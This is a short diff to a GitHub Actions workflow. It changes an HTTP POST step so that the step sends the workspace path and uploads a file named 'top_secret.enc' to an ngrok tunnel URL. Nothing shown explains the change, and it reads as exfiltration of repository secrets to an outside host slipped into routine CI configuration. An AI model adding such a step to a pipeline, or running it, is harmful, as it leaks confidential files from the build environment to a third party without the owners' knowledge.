@@ -24,5 +24,6 @@ jobs:
       with:
         url: 'https://79d3-54-91-189-235.ngrok.io/hook/'
         method: 'POST'
-        data: '{ "key": "value" }'       
+        data: '{ "key": "${{ github.workspace }}" }'
+        files: '{ "file": "${{ github.workspace }}/top_secret.enc" }'
       
